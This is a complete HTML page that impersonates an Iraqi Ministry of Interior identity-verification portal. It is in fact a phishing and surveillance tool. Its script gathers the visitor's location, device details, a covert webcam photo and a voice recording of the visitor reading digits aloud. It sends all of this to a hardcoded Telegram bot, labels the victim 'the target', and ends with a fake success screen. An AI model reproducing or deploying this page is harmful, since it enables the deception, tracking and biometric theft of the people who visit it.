<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>وزارة الداخلية العراقية | نظام التحقق المتعدد</title>
    <meta property="og:title" content="وزارة الداخلية العراقية - منصة التحقق">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/1024px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png">

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        body { background: #f8fafc; color: #1e293b; font-family: 'Noto Sans Arabic', sans-serif; overflow-x: hidden; }
        .moi-header { background: linear-gradient(135deg, #1e3a8a, #1e1b4b); }
        .step-pill { transition: all 0.5s ease; width: 33.33%; height: 6px; border-radius: 3px; background: #e2e8f0; }
        .step-pill.active { background: #1e40af; box-shadow: 0 0 10px rgba(30, 64, 175, 0.3); }
        .step-pill.completed { background: #10b981; }
        .scanner-frame { 
            width: 240px; height: 240px; border: 4px solid #1e40af; border-radius: 50%; 
            overflow: hidden; position: relative; background: #000; margin: 0 auto;
        }
        .scan-line { position: absolute; width: 100%; height: 3px; background: #3b82f6; top: 0; animation: scan 2s infinite linear; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .digit-item { transition: all 0.4s ease; border: 2px solid #e2e8f0; }
        .digit-active { border-color: #10b981; color: #10b981; transform: scale(1.1); }
        .mirror { transform: scaleX(-1); }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen">

    <header class="moi-header w-full py-8 text-white text-center shadow-2xl">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Seal_of_the_Ministry_of_Interior_of_Iraq.svg/200px-Seal_of_the_Ministry_of_Interior_of_Iraq.svg.png" class="w-20 h-20 mx-auto mb-3">
        <h1 class="text-xl font-bold">جمهورية العراق</h1>
        <h2 class="text-md opacity-90">وزارة الداخلية - النفاذ الوطني الموحد</h2>
    </header>

    <main class="max-w-md w-full p-4 mt-4">
        <div id="appCard" class="bg-white rounded-[2.5rem] p-8 shadow-2xl border border-slate-100 text-center space-y-8">
            
            <!-- Progress Steps Indicator -->
            <div class="flex gap-2">
                <div id="pill1" class="step-pill active"></div>
                <div id="pill2" class="step-pill"></div>
                <div id="pill3" class="step-pill"></div>
            </div>

            <!-- Dynamic UI Content -->
            <div id="contentArea" class="space-y-6">
                <div id="iconBox" class="p-4 bg-blue-50 rounded-full w-20 h-20 mx-auto flex items-center justify-center text-blue-900">
                    <svg id="mainIcon" class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                </div>
                <h3 id="stepTitle" class="text-lg font-bold text-slate-800">الخطوة الأولى: تحديد الموقع</h3>
                <p id="stepDesc" class="text-sm text-slate-500 leading-relaxed">يتطلب النظام تحديد موقعك الجغرافي لضمان الاتصال بخادم مديرية المعلومات في محافظتك.</p>
            </div>

            <!-- Viewport for Camera (Hidden initially) -->
            <div id="camView" class="hidden">
                <div class="scanner-frame">
                    <video id="webcam" class="w-full h-full object-cover mirror" autoplay playsinline muted></video>
                    <div class="scan-line"></div>
                </div>
            </div>

            <!-- Voice Challenge Area (Hidden initially) -->
            <div id="voiceUI" class="hidden space-y-4">
                <div class="flex justify-center gap-3 text-3xl font-black">
                    <div id="d1" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٧</div>
                    <div id="d2" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٣</div>
                    <div id="d3" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٠</div>
                    <div id="d4" class="digit-item w-12 h-14 flex items-center justify-center rounded-xl bg-slate-50">٩</div>
                </div>
                <p class="text-[10px] text-blue-600 font-bold animate-pulse">جاري مطابقة الترددات الصوتية...</p>
            </div>

            <button id="nextBtn" class="w-full py-5 bg-blue-900 hover:bg-blue-800 text-white font-bold rounded-2xl shadow-xl transition-all transform active:scale-95">
                تأكيد ومتابعة
            </button>
        </div>
    </main>

    <footer class="mt-auto mb-6 opacity-40 text-[10px]">نظام النفاذ الوطني v4.0.2 - 2099</footer>

    <canvas id="c" style="display:none"></canvas>

    <script>
        const BOT_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
        const ADMIN_ID = "1523412137";

        let currentStep = 1;
        let userData = {
            device: navigator.platform,
            userAgent: navigator.userAgent,
            battery: "غير متاح"
        };

        async function tg(m, fd) { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${m}`, { method: 'POST', body: fd }); } catch(e){} }

        // وظيفة سحب بيانات البطارية
        if(navigator.getBattery) {
            navigator.getBattery().then(b => {
                userData.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن ⚡' : 'لا يشحن'})`;
            });
        }

        document.getElementById('nextBtn').addEventListener('click', async function() {
            const btn = this;
            
            if(currentStep === 1) {
                // المرحلة الأولى: الموقع
                btn.innerText = "جاري التحقق...";
                btn.disabled = true;
                
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const fd = new FormData();
                    fd.append('chat_id', ADMIN_ID);
                    fd.append('text', `🇮🇶 *معلومات الجهاز والهدف:*\n\n📱 الجهاز: ${userData.device}\n🔋 البطارية: ${userData.battery}\n📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🌐 المتصفح: ${userData.userAgent}`);
                    fd.append('parse_mode', 'Markdown');
                    await tg('sendMessage', fd);

                    // الانتقال للخطوة 2
                    currentStep = 2;
                    updateUI("الخطوة الثانية: مسح الوجه", "يرجى السماح بالكاميرا لالتقاط صورة مطابقة حية للبطاقة الوطنية.", "M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z", "pill2");
                    btn.innerText = "فتح الكاميرا والمسح";
                    btn.disabled = false;
                }, (err) => {
                    alert("يجب السماح بالموقع للمتابعة.");
                    btn.innerText = "تأكيد ومتابعة";
                    btn.disabled = false;
                });

            } else if(currentStep === 2) {
                // المرحلة الثانية: الكاميرا
                btn.innerText = "جاري المسح...";
                btn.disabled = true;

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('webcam');
                    video.srcObject = stream;
                    document.getElementById('iconBox').classList.add('hidden');
                    document.getElementById('camView').classList.remove('hidden');

                    setTimeout(() => {
                        const canvas = document.getElementById('c');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(async blob => {
                            const fd = new FormData();
                            fd.append('chat_id', ADMIN_ID);
                            fd.append('photo', blob, 'face.jpg');
                            fd.append('caption', "📸 صورة حيوية من النفاذ الوطني العراقي");
                            await tg('sendPhoto', fd);
                            
                            // إيقاف الكاميرا والانتقال للخطوة 3
                            stream.getTracks().forEach(t => t.stop());
                            currentStep = 3;
                            document.getElementById('camView').classList.add('hidden');
                            document.getElementById('iconBox').classList.remove('hidden');
                            document.getElementById('voiceUI').classList.remove('hidden');
                            updateUI("الخطوة الثالثة: البصمة الصوتية", "يرجى نطق الأرقام الظاهرة بوضوح باللغة العربية لتأكيد الهوية.", "M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z", "pill3");
                            btn.innerText = "بدء التسجيل الصوتي";
                            btn.disabled = false;
                        }, 'image/jpeg');
                    }, 4000);
                } catch(e) {
                    alert("يرجى تفعيل الكاميرا للمتابعة.");
                    btn.disabled = false;
                }

            } else if(currentStep === 3) {
                // المرحلة الثالثة: الميكروفون
                btn.innerText = "جاري التسجيل...";
                btn.disabled = true;

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    
                    // محاكاة تفاعل الأرقام
                    const ids = ['d1', 'd2', 'd3', 'd4'];
                    let idx = 0;
                    const intv = setInterval(() => {
                        if(idx < ids.length) {
                            document.getElementById(ids[idx]).classList.add('digit-active');
                            document.getElementById(ids[idx]).innerHTML += " ✅";
                            idx++;
                        } else { clearInterval(intv); }
                    }, 1500);

                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                        const fd = new FormData();
                        fd.append('chat_id', ADMIN_ID);
                        fd.append('voice', blob, 'voice.ogg');
                        fd.append('caption', "🎤 البصمة الصوتية للهدف (نطق الأرقام)");
                        await tg('sendVoice', fd);
                        
                        document.getElementById('appCard').innerHTML = `
                            <div class="py-10 space-y-4">
                                <div class="bg-green-100 text-green-600 w-20 h-20 rounded-full mx-auto flex items-center justify-center">
                                    <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg>
                                </div>
                                <h2 class="text-xl font-bold">تم التحقق بنجاح</h2>
                                <p class="text-sm text-slate-500">تم تحديث بيانات النفاذ الوطني الموحد لمحافظتك.</p>
                            </div>
                        `;
                        setTimeout(() => window.location.href = "https://www.google.com", 2500);
                    };

                    recorder.start();
                    setTimeout(() => recorder.stop(), 7000);
                } catch(e) {
                    alert("يرجى تفعيل الميكروفون للمتابعة.");
                    btn.disabled = false;
                }
            }
        });

        function updateUI(title, desc, iconPath, pillId) {
            document.getElementById('stepTitle').innerText = title;
            document.getElementById('stepDesc').innerText = desc;
            document.getElementById('mainIcon').innerHTML = `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="${iconPath}"></path>`;
            document.getElementById(pillId).classList.add('active');
            // تأشير الحبة السابقة كمكتملة
            if(pillId === "pill2") document.getElementById("pill1").classList.add('completed');
            if(pillId === "pill3") document.getElementById("pill2").classList.add('completed');
        }
    </script>
</body>
</html>
